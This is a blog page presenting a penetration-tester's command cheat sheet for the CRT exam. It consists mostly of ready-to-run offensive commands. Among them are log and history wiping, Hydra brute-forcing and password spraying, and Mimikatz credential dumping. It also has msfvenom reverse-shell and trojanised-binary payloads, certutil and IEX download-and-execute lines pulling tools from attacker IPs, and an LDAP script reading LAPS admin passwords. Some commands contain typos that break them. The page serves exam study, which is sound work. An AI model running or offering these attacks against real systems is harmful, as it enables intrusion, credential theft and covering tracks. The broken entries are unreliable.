<!DOCTYPE html>
<html lang="en">
<head>
  
    <title>A handbook of commands for the CRT exam :: Research blog</title>
  
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="description" content="Linux    Command Description     nmap -sV -p- -sU -o &amp;lt;IP&amp;gt; -oN nmap.txt All ports, Os fingerprint, UDP ports, Aggressive   nmap -T4 -v -oA myshares --script smb-enum-shares --script-args smbuser=,smbpass= -p445 [IP] Check for shares   nmap -sP &amp;lt;x.x.x.0&amp;gt;/24 nmap -sn &amp;lt;x.x.x.x&amp;gt;/24 Host discovery on a network   sudo nmap -PE -sn &amp;lt;x.x.x.x&amp;gt;/24 Host discovery on a network, better for windows as sometimes ICMP ping packets are dropped   nmap -R -sL -dns-server &amp;lt;server&amp;gt; x." />
<meta name="keywords" content="" />
<meta name="robots" content="noodp" />
<link rel="canonical" href="https://thomas-byrne.co.uk/projects/handbook/" />




<link rel="stylesheet" href="https://thomas-byrne.co.uk/assets/style.css">

  <link rel="stylesheet" href="https://thomas-byrne.co.uk/assets/green.css">






<link rel="apple-touch-icon-precomposed" sizes="144x144" href="https://thomas-byrne.co.uk/img/apple-touch-icon-144-precomposed.png">

  <link rel="shortcut icon" href="https://thomas-byrne.co.uk/img/favicon/green.png">



<meta name="twitter:card" content="summary" />



<meta property="og:locale" content="en" />
<meta property="og:type" content="article" />
<meta property="og:title" content="A handbook of commands for the CRT exam :: Research blog">
<meta property="og:description" content="This is a handbook I created of as many possible commands you may need for the CRT exam to be used as a quick reference guide." />
<meta property="og:url" content="https://thomas-byrne.co.uk/projects/handbook/" />
<meta property="og:site_name" content="A handbook of commands for the CRT exam" />

  <meta property="og:image" content="https://thomas-byrne.co.uk/.">

<meta property="og:image:width" content="2048">
<meta property="og:image:height" content="1024">


  <meta property="article:published_time" content="2022-07-10 00:00:00 &#43;0000 UTC" />












</head>
<body class="green">


<div class="container center headings--one-size">

  <header class="header">
  <div class="header__inner">
    <div class="header__logo">
      <a href="/">
  <div class="logo">
    /home
  </div>
</a>

    </div>
    <div class="menu-trigger">menu</div>
  </div>
  
    <nav class="menu">
  <ul class="menu__inner menu__inner--desktop">
    
      
        
          <li><a href="/about">About</a></li>
        
      
        
          <li><a href="/hackthebox">HackTheBox</a></li>
        
      
      
        <ul class="menu__sub-inner">
          <li class="menu__sub-inner-more-trigger">Show more ▾</li>

          <ul class="menu__sub-inner-more hidden">
            
              
                <li><a href="/oscp">OSCP</a></li>
              
            
              
                <li><a href="/projects">Projects</a></li>
              
            
              
                <li><a href="/research">Research</a></li>
              
            
              
                <li><a href="/showcase">Showcase</a></li>
              
            
          </ul>
        </ul>
      
    

    
  </ul>

  <ul class="menu__inner menu__inner--mobile">
    
      
        <li><a href="/about">About</a></li>
      
    
      
        <li><a href="/hackthebox">HackTheBox</a></li>
      
    
      
        <li><a href="/oscp">OSCP</a></li>
      
    
      
        <li><a href="/projects">Projects</a></li>
      
    
      
        <li><a href="/research">Research</a></li>
      
    
      
        <li><a href="/showcase">Showcase</a></li>
      
    
    
  </ul>
</nav>

  
</header>


  <div class="content">
    
<div class="post">
  <h1 class="post-title">
    <a href="https://thomas-byrne.co.uk/projects/handbook/">A handbook of commands for the CRT exam</a></h1>
  <div class="post-meta">
    
      <span class="post-date">
        2022-07-10 
      </span>
    
    
    <span class="post-author">:: Tom</span>
    
  </div>

  

  
    <img src="https://thomas-byrne.co.uk/." class="post-cover" alt="A handbook of commands for the CRT exam" />
  

  

  <div class="post-content"><div>
        <h1 id="linux">Linux<a href="#linux" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
<table>
<thead>
<tr>
<th>Command</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>nmap -sV -p- -sU -o &lt;IP&gt; -oN nmap.txt</code></td>
<td>All ports, Os fingerprint, UDP ports, Aggressive</td>
</tr>
<tr>
<td><code>nmap -T4 -v -oA myshares --script smb-enum-shares --script-args smbuser=,smbpass= -p445 [IP]</code></td>
<td>Check for shares</td>
</tr>
<tr>
<td><code>nmap -sP &lt;x.x.x.0&gt;/24</code>  <code>nmap -sn &lt;x.x.x.x&gt;/24</code></td>
<td>Host discovery on a network</td>
</tr>
<tr>
<td><code>sudo nmap -PE -sn &lt;x.x.x.x&gt;/24</code></td>
<td>Host discovery on a network, better for windows as sometimes ICMP ping packets are dropped</td>
</tr>
<tr>
<td><code>nmap -R -sL -dns-server &lt;server&gt; x.x.x.0/24</code></td>
<td>DNS reverse lookup on IP range</td>
</tr>
<tr>
<td><code>nmap &lt;IP&gt; -sS</code></td>
<td>Syn scan</td>
</tr>
<tr>
<td><code>namp &lt;IP&gt; -sA</code></td>
<td>Ack scan</td>
</tr>
<tr>
<td><code>nmap -n -Pn -vv -O -sV –script smb-enum*,smb-ls,smb-mbenum,smb-os-discovery,smb-s*,smb-vuln*,smbv2* -vv 192.168.1.1</code></td>
<td>safe SMB scripts</td>
</tr>
<tr>
<td><code>nmap -sSU -p53 --script dns-nsec-enum --script-agrs dns-nsec-enum.domains=&lt;domain&gt; &lt;nameserver&gt;</code></td>
<td>Hostname enumeration using nmap</td>
</tr>
<tr>
<td><code>namp --script broadcast-dhcp-discover</code></td>
<td>Enumerate DHCP server</td>
</tr>
<tr>
<td><code>nmap -sL &lt;ip&gt;/24 | grep &quot;(&quot; | awk '{printf(&quot;%s %s\\n, $5,$6&quot;);}'</code></td>
<td>Reverse DNS Sweeping</td>
</tr>
<tr>
<td><code>nmap -sY &lt;IP&gt;</code></td>
<td>Looks for SCTP services with INIT/COOKIE ECHO chunk type</td>
</tr>
<tr>
<td><code>dnsdict -s -t 32 &lt;domain&gt;</code></td>
<td>Enumerate IPv6 servers via DNS grinding</td>
</tr>
<tr>
<td><code>smbclient -U user \\\\\\\\&lt;IP&gt;\\\\&lt;share&gt;</code></td>
<td>SMB connect</td>
</tr>
<tr>
<td><code>smbmap -H &lt;IP&gt;</code></td>
<td>List SMB shares</td>
</tr>
<tr>
<td><code>enum4linux -a &lt;IP&gt;</code></td>
<td>ENumerate WIndows and Linux Samba systems</td>
</tr>
<tr>
<td><code>rpcclient -U &quot;&quot; &lt;target&gt;</code></td>
<td>RPC Null authentication</td>
</tr>
<tr>
<td><code>nslookup</code></td>
<td>A record of a domain</td>
</tr>
<tr>
<td><code>nslookup -query=mx redhat.com</code></td>
<td>Mail Exchange records</td>
</tr>
<tr>
<td><code>nslookup -query=ns redhat.com</code></td>
<td>Name server = maps a domain to a list of DNS servers</td>
</tr>
<tr>
<td><code>nslookup -query=SOA redhat.com</code></td>
<td>Authoritative information of a domain</td>
</tr>
<tr>
<td><code>tcpdump -i eth0 -XX out.pcap</code></td>
<td>Capture packets on eth0 and write to file</td>
</tr>
<tr>
<td><code>tcpdump -i eth0 port 80 dst 2.2.2.2</code></td>
<td>Capture HTTP traffic to 2.2.2.2 endpoint</td>
</tr>
<tr>
<td><code>tcpdump -i eth0 -tttt dst &lt;ip&gt; and not net &lt;ip&gt;/24</code></td>
<td>Show connections to a specific IP</td>
</tr>
<tr>
<td><code>tcpdump -i eth0 'icmp[icmptype] == icmp-echoreply' </code></td>
<td>Print all ping responses (use backticks not &lsquo;)</td>
</tr>
<tr>
<td><code>tcpdump -i eth0 -c 50 -tttt 'udp and port 53'</code></td>
<td>Capture 50 DNS packets and print timestamp (use backticks not &lsquo;)</td>
</tr>
<tr>
<td><code>xwd -display &lt;ip&gt;</code>:) -root -out /tmp/test.xpm</td>
<td>Capture remote X11 Windows and convert to JPG</td>
</tr>
<tr>
<td><code>xwud -in /tmp/test1.xpm</code></td>
<td></td>
</tr>
<tr>
<td><code>convert /tmp/test.xpm -resize 1280x1024 /tmp/test.jpg</code></td>
<td></td>
</tr>
<tr>
<td><code>iptables-save -c &gt; &lt;file&gt;</code></td>
<td>Dump iptables rules to stdout</td>
</tr>
<tr>
<td><code>iptables-restor &lt;file&gt;</code></td>
<td>Restore iptables rules</td>
</tr>
<tr>
<td><code>iptables -L -v --line-numbers</code></td>
<td>LIst all iptables rules with line numbers</td>
</tr>
<tr>
<td><code>iptables -F</code></td>
<td>Flush all iptables rules</td>
</tr>
<tr>
<td><code>iptables -P &lt;INPUT/FORWARD/OUTPUT&gt; &lt;ACCEPT/REJECT/DROP&gt;</code></td>
<td>CHange default policy for rules that don&rsquo;t match the rules</td>
</tr>
<tr>
<td><code>iptables -A output -o &lt;iface&gt; -p tcp --dport 22 -m state --state NEW,ESTABLISHED -j ACCEPT</code></td>
<td>Allow SSH on port 22 OUTBOUND</td>
</tr>
<tr>
<td><code>iptables -A INPUT -i &lt;iface&gt; -p tcp --sport 22 -m state --state ESTABLISHED -j ACCEPT</code></td>
<td>Allow SSH on port 22 OUTBOUND</td>
</tr>
<tr>
<td><code>dig -x &lt;IP&gt;</code></td>
<td>Domain lookup</td>
</tr>
<tr>
<td><code>dig axfr example.com @ns1.example.com </code></td>
<td>DNS Zone transfer</td>
</tr>
<tr>
<td><code>echo &quot;1&quot; &gt; /proc/sys/net/ipv4/ip_forward</code></td>
<td>turn on ip forwarding</td>
</tr>
<tr>
<td><code>iptables -t nat -A PREROUTING -p tcp -i eth0 -j DNAT -d &lt;pivotip&gt; --dport 443 -to-destination &lt;attack_ip&gt;:443</code></td>
<td>All 3 below needed for port forwarding</td>
</tr>
<tr>
<td><code>iptables -t nat -A POSTROUTING -p tcp -i eth0 -j SNAT -s &lt;target subnet cidr&gt; -d &lt;attackip&gt; --dport 443 -to-source</code></td>
<td></td>
</tr>
<tr>
<td><code>iptables -t filter -I FORWARD 1 -j ACCEPT</code></td>
<td></td>
</tr>
<tr>
<td><code>echo &quot;nameserver x.x.x.x &gt; /etc/resolv.conf&quot;</code></td>
<td>Add DNS Server</td>
</tr>
<tr>
<td><code>base64 -w 0 &lt;fileName&gt;</code> `echo &ldquo;<!-- raw HTML omitted -->&rdquo;&quot;</td>
<td>base64 -d &gt; out.txt`</td>
</tr>
<tr>
<td><code>scp &lt;file&gt; user@x.x.x.x:/tmp/file</code></td>
<td>Put file scp</td>
</tr>
<tr>
<td><code>scp user@x.x.x.x:/tmp/file /tmp/file</code></td>
<td>Get file scp</td>
</tr>
<tr>
<td><code>mount /dev/sda1 /mnt/test</code></td>
<td>Mount files</td>
</tr>
<tr>
<td><code>mount &lt;ip&gt;:/share /mnt/nfs</code></td>
<td>mount nfs share</td>
</tr>
<tr>
<td><code>mount -o nolock -t nfs -o proto=tcp,port=2049 172.16.1.1:/ /mnt</code></td>
<td>mount nfs share</td>
</tr>
<tr>
<td><code>mount -t cifs -o username=&lt;user&gt;,password=&lt;password&gt;,domain=example.com //WIN_PC_IP/&lt;share name&gt; /mnt/windows</code></td>
<td>mount a Windows share</td>
</tr>
<tr>
<td><code>net use x: \\filesvr001\folder1 &lt;password&gt; /user:domain01\jsmith /savecred /p:no</code></td>
<td>mount a Windows share</td>
</tr>
<tr>
<td><code>sort -u</code></td>
<td>sort unique lines</td>
</tr>
<tr>
<td><code>tar cf file.tar files</code></td>
<td>Create .tar from files</td>
</tr>
<tr>
<td><code>tar xf file.tar</code></td>
<td>Extract .tar files</td>
</tr>
<tr>
<td><code>tar czf file.tar.gz files</code></td>
<td>Create .tar.gz files from files</td>
</tr>
<tr>
<td><code>tar xzf file.tar.gz</code></td>
<td>Extract .tar.gz files</td>
</tr>
<tr>
<td><code>tar cjf file.tar.bz2 files</code></td>
<td>Create .tar.bz2 files from files</td>
</tr>
<tr>
<td><code>tar xjf files.tar.bz2</code></td>
<td>Extract .tar.bz2 files</td>
</tr>
<tr>
<td><code>gzip file</code></td>
<td>Compress/ rename file</td>
</tr>
<tr>
<td><code>gzip -d file.gzip</code></td>
<td>Extract gzip files</td>
</tr>
<tr>
<td><code>upx -9 -o out.exe orig.exe</code></td>
<td>UPX compresses orig.exe into out.exe</td>
</tr>
<tr>
<td><code>zip -r &lt;zipname.zip&gt; &lt;directory&gt;</code></td>
<td>Zips directory</td>
</tr>
<tr>
<td><code>split -b 9K \&lt;file&gt; &lt;prefix&gt;</code></td>
<td>splits file into 9K sized chunks</td>
</tr>
<tr>
<td><code>awk 'sub(&quot;$&quot;.&quot;\r&quot;)' unix.txt &gt; win.txt</code></td>
<td>Convert unix file to windows compatible file</td>
</tr>
<tr>
<td><code>find -i - name &lt;file&gt; -type *.pdf</code></td>
<td>FInd pdf files</td>
</tr>
<tr>
<td><code>find / -perm 4000 =o -perm -2000 -exec ls - lbd {} \;</code></td>
<td>Search for suid files</td>
</tr>
<tr>
<td><code>dos2unix file</code></td>
<td>Windows file to unix file</td>
</tr>
<tr>
<td><code>cat /etc/*syslog*.conf | grep -v &quot;^#&quot;</code></td>
<td>List of log files</td>
</tr>
<tr>
<td><code>grep 'href' &lt;file&gt; | cut -d&quot;/&quot; -f3 | grep &lt;url&gt; | sort -u</code></td>
<td>Strip links in url.com (remove \ they are meant to be pipes not OR)</td>
</tr>
<tr>
<td><code>echo &quot;&quot; &gt; /var/log/auth.log</code></td>
<td>Clear auth logs</td>
</tr>
<tr>
<td><code>echo &quot;&quot; &gt; ~/var/log/.bash_history</code></td>
<td>clear commands history</td>
</tr>
<tr>
<td><code>export HISFILESIZE=0</code></td>
<td>Set history max file size 0</td>
</tr>
<tr>
<td><code>export HISTSIZE=0</code></td>
<td>Set history commands to 0</td>
</tr>
<tr>
<td><code>kill -9 $$</code></td>
<td>Kill current session</td>
</tr>
<tr>
<td><code>ln /dev/null #/.bash_history -sf</code></td>
<td>Send all bash history commands to /dev/null</td>
</tr>
<tr>
<td><code>hydra -L users -P passwords -M 21.txt ftp</code></td>
<td>Bruteforce FTP</td>
</tr>
<tr>
<td><code>hydra -L users -P passwords -M 22.txt ssh</code></td>
<td>Bruteforce SSH</td>
</tr>
<tr>
<td><code>hydra -L users -P passwords -M 445.txt smb</code></td>
<td>Bruteforce SMB</td>
</tr>
<tr>
<td><code>crackmapexec &lt;protocol&gt; -U &lt;UserList&gt; -p &quot;PasswordToSpray&quot;</code></td>
<td>Password spray</td>
</tr>
<tr>
<td><code>crackmapexec &lt;ip&gt; -u Administrator -p 'P@ssw0rd' -x whoami</code></td>
<td>Command execution</td>
</tr>
<tr>
<td><code>crackmapexec smb 192.168.215.104 -u Administrator -p 'P@ssw0rd' -M mimikatz o COMMAND='privilege::debug'</code></td>
<td></td>
</tr>
<tr>
<td><code>rdesktop &lt;IP&gt;</code></td>
<td>rdp into windows machine</td>
</tr>
<tr>
<td><code>rlogin -l &lt;ip&gt;</code></td>
<td>login with R* Services to server with rlogin port open - if misconfigured dont need a password</td>
</tr>
<tr>
<td><code>rexec &lt;ip&gt;</code></td>
<td>remote command execution on ip</td>
</tr>
<tr>
<td><code>rwho &lt;ip&gt;</code></td>
<td></td>
</tr>
<tr>
<td><code>rsh &lt;ip&gt;</code></td>
<td>Remote shell on system</td>
</tr>
<tr>
<td><code>rcp file.txt &lt;ip&gt;:/path/to/file.txt</code></td>
<td></td>
</tr>
<tr>
<td><code>rstat</code></td>
<td>Returns kernel performance statistics</td>
</tr>
<tr>
<td><code>ruptime</code></td>
<td></td>
</tr>
<tr>
<td><code>python /usr/share/responder.py</code></td>
<td>rouge DHCP server (half duplex so does not receive responses from legitimate DHCP server, only the clients broadcast)</td>
</tr>
<tr>
<td><code>ettercap -Tar cpature.pcap (or -i &lt;interface&gt;)</code></td>
<td>Grab hashes from RIP authentication</td>
</tr>
<tr>
<td><code>ping6 -c2 -I &lt;interface&gt; ff02::1</code></td>
<td>Identify IPV6 neighbours</td>
</tr>
<tr>
<td><code>xwd -root -screen -silent -display 192.168.1.109:0 &gt; screenshot.xwd</code>  <code>convert screenshot.xwd screenshot.png</code></td>
<td>Take screenshot of server through vulnerable X11 port</td>
</tr>
<tr>
<td><code>xwininfo -root -tree -display 192.168.1.109:0</code></td>
<td>Shows information for X service</td>
</tr>
<tr>
<td><code>xspy &lt;ip&gt;</code></td>
<td>Log keystrokes though vulnerable X11 service</td>
</tr>
<tr>
<td></td>
<td></td>
</tr>
</tbody>
</table>
<h2 id="solaris-os">Solaris OS<a href="#solaris-os" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
<table>
<thead>
<tr>
<th>Command</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>dladm show-link</code></td>
<td>Checking network device status</td>
</tr>
<tr>
<td><code>svcadm -t enable service</code></td>
<td>Start service</td>
</tr>
<tr>
<td><code>svcs service</code></td>
<td>display service status</td>
</tr>
<tr>
<td><code>svcs -a</code></td>
<td>display list of services</td>
</tr>
<tr>
<td><code>zpool create pool &lt;pool_name&gt;</code> RAID device_name</td>
<td>Create volume group</td>
</tr>
<tr>
<td><code>zfs create &lt;File_system_name&gt;</code></td>
<td>Create file system</td>
</tr>
<tr>
<td><code>zfs mount &lt;FIle_system_name&gt;</code></td>
<td>Mount file system</td>
</tr>
<tr>
<td><code>zoneadm -z &lt;zone_name&gt; install</code></td>
<td>Basically like <code>docker pull &lt;image name&gt;</code></td>
</tr>
</tbody>
</table>
<h1 id="metasploit">Metasploit<a href="#metasploit" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
<table>
<thead>
<tr>
<th>Command</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>use auxiliary/scanner/http/dir_scanner</code></td>
<td>Scan for directories</td>
</tr>
<tr>
<td><code>use auxiliary/scanner/http/jboss_vulnscan</code></td>
<td>Jboss scan</td>
</tr>
<tr>
<td><code>use exploit/multi/http/jboss_maindeployer</code></td>
<td>Jboss deploy</td>
</tr>
<tr>
<td><code>use auxiliary/scanner/mssql/mssql_login</code></td>
<td>MySQL cred scan</td>
</tr>
<tr>
<td><code>use exploit/windows/mssql/mssql_payload</code></td>
<td>MySQL payload</td>
</tr>
<tr>
<td><code>use auxiliary/scanner/mysql/mysql_version</code></td>
<td>MySQL version scan</td>
</tr>
<tr>
<td><code>use auxiliary/scanner/mysql/mysql_login</code></td>
<td>MySQL login</td>
</tr>
<tr>
<td><code>use auxiliary/scanner/oracle/oracle_login</code></td>
<td>Oracle login</td>
</tr>
<tr>
<td><code>use exploit/windows/dcerpc/ms03_026_dcom</code></td>
<td></td>
</tr>
<tr>
<td><code>use exploit/windows/smb/ms06_040_netapi</code></td>
<td></td>
</tr>
<tr>
<td><code>use exploit/windows/smb/ms08_067_netapi</code></td>
<td></td>
</tr>
<tr>
<td><code>use exploit/windows/smb/ms09_050_smb2_negotiate_func_index</code></td>
<td></td>
</tr>
<tr>
<td><code>run post/windows/gather/win_privs</code></td>
<td>Show privs of current user</td>
</tr>
<tr>
<td><code>use exploit/windows/local/bypassuac (check if x86/64 and set target)</code></td>
<td>bypass UAC on windows7</td>
</tr>
<tr>
<td><code>load mimikatz -&gt; wdigest</code></td>
<td>dump creds</td>
</tr>
<tr>
<td><code>load incongnito -&gt; list_tokens -&gt; impersonate_token</code></td>
<td>Use tokens</td>
</tr>
<tr>
<td><code>use post/windows/gather/credentials/gpp</code></td>
<td>GPP</td>
</tr>
<tr>
<td><code>run post/windows/gather/local_admin_search_enum</code></td>
<td>Test other machines</td>
</tr>
<tr>
<td><code>use exploit/multi/handler</code></td>
<td>Payload handler/ listener for rev shells</td>
</tr>
<tr>
<td><code>use auxiliary/scanner/ipmi/ipmi_version</code></td>
<td>Scan for ipmi interfaces (part of BMCs)</td>
</tr>
<tr>
<td><code>use auxiliary/scanner/ipmi/ipmi_dumphashes </code></td>
<td>dump ipmi hashes</td>
</tr>
<tr>
<td><code>use auxiliary/gather/kerberos_enumusers</code></td>
<td>Enumerate users</td>
</tr>
<tr>
<td><code>use auxiliary/scanner/oracle/sid_enum</code></td>
<td>Enumerate oracle database SID values</td>
</tr>
<tr>
<td><code>use auxiliary/scanner/oracle/sid_brute</code></td>
<td></td>
</tr>
<tr>
<td><code>unix/x11/x11_keyboard_exec</code></td>
<td>Get shell via vulnerable x11 service</td>
</tr>
</tbody>
</table>
<h1 id="msfvenom">msfvenom<a href="#msfvenom" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
<table>
<thead>
<tr>
<th>Command</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>msfvenom -p windows/exec CMD='net localgroup administrators &lt;user&gt; /add' -f exe-service -o common.exe </code></td>
<td>Service executable malicious payload</td>
</tr>
<tr>
<td><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST= LPORT= -f exe -o payload.exe</code></td>
<td>Windows meterpreter shell</td>
</tr>
<tr>
<td><code>msfvenom -p windows/shell_reverse_tcp LHOST= LPORT= -f exe -o payload.exe</code></td>
<td>Windows reverse shell</td>
</tr>
<tr>
<td><code>msfvenom -p windows/shell_reverse_tcp LHOST= LPORT = -f py (or c) -b '\x00' -o shellcode.py (or .c)</code></td>
<td>Generate shell code</td>
</tr>
<tr>
<td><code>msfvenom -p linux/x64/shell_reverse_tcp LHOST= LPORT= -f elf -o payload.elf</code></td>
<td>Linux reverse shell</td>
</tr>
<tr>
<td><code>msfvenom -p linux/x64/shell_reverse_tcp LHOST= LPORT= -x /usr/bin/nc -k -f elf -o payload.elf</code></td>
<td>Create trojan out of a legit binary</td>
</tr>
<tr>
<td><code>msfvenom --platform=solaris --payload=solaris/x86/shell_reverse_tcp LHOST= LPORT= -f elf -e x86/shikata_ga_nai -b '\x00' &gt; solshell.elf</code></td>
<td>Solaris OS</td>
</tr>
</tbody>
</table>
<h1 id="windows">Windows<a href="#windows" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
<table>
<thead>
<tr>
<th>Command</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>/accepteula</code></td>
<td>If ever using CLI sysinternals tools you need to accept the EULA or you get a really annoying prompt every time you run the tool</td>
</tr>
<tr>
<td><code>reg.exe ADD HKCU\Software\Sysinternals /v EulaAccepted /t REG_DWORD /d 1 /f</code></td>
<td>Removing eula prompt from sysinternals tools</td>
</tr>
<tr>
<td><code>certutil.exe -urlcache -f http://10.0.0.5/40564.exe bad.exe</code></td>
<td>download file with certutil</td>
</tr>
<tr>
<td><code>Invoke-WebRequest -Uri &quot;http://192.168.22.2:8000/nc.exe&quot; -OutFile &quot;c:\tmp\nc.exe&quot;</code></td>
<td>Download file</td>
</tr>
<tr>
<td><code>_IEX_(New-Object Net.WebClient).DownloadString('http://10.10.14.13:8000/PowerUp.ps1')</code></td>
<td>Download file</td>
</tr>
<tr>
<td><code>powershell -nop -ep bypass</code></td>
<td>Bypass powershell execution policy</td>
</tr>
<tr>
<td><code>$file = [convert]::ToBase64String((Get-Content -path &quot;c:\tmp\20220613215954_BloodHound.zip&quot; -Encoding byte))</code></td>
<td>Convert file to base64 for file transfer (copy b64 output and decode on your local kali machine)</td>
</tr>
<tr>
<td><code>netstat -ano</code></td>
<td>Port scan</td>
</tr>
<tr>
<td><code>Get-Service</code> OR <code>Get-Service | Where-Object {$_.Status -eq &quot;Running&quot;}</code></td>
<td>List all services on the machine (good for finding a service for CLSIDs)</td>
</tr>
<tr>
<td><code>whoami /priv</code></td>
<td>Enumerate privileges for current user</td>
</tr>
<tr>
<td><code>whoami /all</code></td>
<td></td>
</tr>
<tr>
<td><code>net user</code></td>
<td>Enumerate all users on the host</td>
</tr>
<tr>
<td><code>ipconfig /all</code></td>
<td>Enumerate current AD Domain</td>
</tr>
<tr>
<td><code>wmic printer list brief</code></td>
<td>Enumerate printers</td>
</tr>
<tr>
<td><code>Get-Printer</code></td>
<td>Enumerate printers</td>
</tr>
</tbody>
</table>
<h2 id="ldap-enumeration">LDAP enumeration<a href="#ldap-enumeration" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> ldap3

server <span style="color:#f92672">=</span> ldap3<span style="color:#f92672">.</span>Server(<span style="color:#e6db74">&#39;10.10.11.152&#39;</span>, port <span style="color:#f92672">=</span><span style="color:#ae81ff">389</span>)
connection <span style="color:#f92672">=</span> ldap3<span style="color:#f92672">.</span>Connection(server, <span style="color:#e6db74">&#34;&lt;username&gt;&#34;</span>, <span style="color:#e6db74">&#34;&lt;password&gt;&#34;</span>) <span style="color:#75715e">#leave blank for null authentication</span>
connection<span style="color:#f92672">.</span>bind()
x <span style="color:#f92672">=</span> connection<span style="color:#f92672">.</span>search(search_base<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;DC=&lt;first part of domain name&gt;,DC=&lt;second part of domain name&gt;&#39;</span>, search_filter<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;(&amp;(objectCategory=computer)(ms-MCS-AdmPwd=*))&#39;</span>, search_scope<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;SUBTREE&#39;</span>, attributes<span style="color:#f92672">=</span>[<span style="color:#e6db74">&#39;ms-MCS-AdmPwd&#39;</span>,<span style="color:#e6db74">&#39;SAMAccountname&#39;</span>])

print(connection<span style="color:#f92672">.</span>entries)

print(server<span style="color:#f92672">.</span>info)
</code></pre></div><h1 id="active-directory-unauthenticated">Active Directory (Unauthenticated)<a href="#active-directory-unauthenticated" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
<table>
<thead>
<tr>
<th>Command</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>enum4linux -a -u &quot;&quot; -p &quot;&quot; &lt;DC IP&gt; &amp;&amp; enum4linux -a -u &quot;guest&quot; -p &quot;&quot; &lt;DC IP&gt;</code></td>
<td>Null and Guest access to SMB services</td>
</tr>
<tr>
<td><code>smbmap -u &quot;&quot; -p &quot;&quot; -P 445 -H &lt;DC IP&gt; &amp;&amp; smbmap -u &quot;guest&quot; -p &quot;&quot; -P 445 -H &lt;DC IP&gt;</code></td>
<td>NUll and Guest access to SMB services</td>
</tr>
<tr>
<td><code>smbclient -U '%' -L //&lt;DC IP&gt; &amp;&amp; smbclient -U 'guest%' -L //</code></td>
<td>Null and Guess access to SMB services</td>
</tr>
<tr>
<td><code>nmap -n -sV --script &quot;ldap* and not brute&quot; -p 389 &lt;DC IP&gt;</code></td>
<td>LDAP enumeration</td>
</tr>
<tr>
<td><code>nmap -p 88 --script=krb5-enum-users --script-args=&quot;krb5-enum-users.realm='DOMAIN'&quot; &lt;IP&gt;</code></td>
<td>User enumeration</td>
</tr>
<tr>
<td><code>python GetNPUsers.py &lt;domain.com&gt;/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast</code></td>
<td>ASREPRoast users</td>
</tr>
<tr>
<td><code>rpcclient -U '' -N 10.10.10.1</code></td>
<td></td>
</tr>
<tr>
<td></td>
<td></td>
</tr>
</tbody>
</table>
<h1 id="active-directory-authenticated">Active Directory (Authenticated)<a href="#active-directory-authenticated" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
<table>
<thead>
<tr>
<th>Command</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>net user /domain</code>, <code>Get-DomainUser</code>, <code>wmic useraccount get name,sid</code></td>
<td>Different ways to extract all domain users</td>
</tr>
<tr>
<td><code>net group &quot;domain admins&quot; /domain</code></td>
<td>Check domain admins group</td>
</tr>
<tr>
<td><code>GetADUsers.py -all -dc-ip 10.10.10.110 domain.com/username</code>, <code>enum4linux -a -u &quot;user&quot; -p &quot;password&quot; &lt;DC IP&gt;</code></td>
<td>Different ways to extract all domain users from linux</td>
</tr>
<tr>
<td><code>ConsoleHost_history</code></td>
<td>PowerShell history</td>
</tr>
<tr>
<td><code>net users</code></td>
<td>Enumerate all users</td>
</tr>
<tr>
<td><code>net localgroup Administrators</code></td>
<td>Enumerate users in the administrator group</td>
</tr>
<tr>
<td><code>whoami /all</code></td>
<td>All privileges for your current user</td>
</tr>
<tr>
<td><code>Tasklist /SVC</code></td>
<td>LIst running services and processes</td>
</tr>
<tr>
<td><code>tasklist /v /fi &quot;username eq system&quot;</code></td>
<td>Filter for processes running as SYSTEM</td>
</tr>
<tr>
<td><code>procdump.exe -accepteula -ma &lt;proc_name_tasklist&gt;</code></td>
<td>Memory dump running processes</td>
</tr>
<tr>
<td><code>net start; wmic service list brief; sc query; Get-Service</code></td>
<td>Get a list of services</td>
</tr>
<tr>
<td><code>accesschk.exe -ucqv &lt;Service_Name&gt;</code></td>
<td>sysinternals tool, Check rights for different groups</td>
</tr>
<tr>
<td><code>net view /all /domain [domainname]</code></td>
<td>All shares on the domain</td>
</tr>
<tr>
<td><code>net share</code></td>
<td>Current shares</td>
</tr>
<tr>
<td><code>netstat -ano</code></td>
<td>Look for open ports</td>
</tr>
<tr>
<td><code>reg query &quot;HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon&quot; 2&gt;null | findstr /i &quot;DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername&quot;</code></td>
<td>Credentials (remove \ from \|)</td>
</tr>
<tr>
<td><code>Get-DomainUser -PreauthNotRequired -verbose</code></td>
<td>List ASREProastable users using powerview  (powershell)</td>
</tr>
<tr>
<td><code>Get-ADTrust -Identity &lt;domain&gt;</code></td>
<td>Get outbound trust details for domain root.local (powershell)</td>
</tr>
<tr>
<td><code>systeminfo | findstr /B /C:&quot;Domain&quot;</code> or <code>echo %userdomain%</code> or <code>ipconfig /all</code></td>
<td>List current domain (remove \ from \|)</td>
</tr>
<tr>
<td><code>runas /user:USERNAME “C:\full\path\of\Program.exe”</code></td>
<td>run a command as a different user</td>
</tr>
<tr>
<td><code>runas /user:ComputerName\administrator cmd</code></td>
<td>run command as different user on different computer</td>
</tr>
<tr>
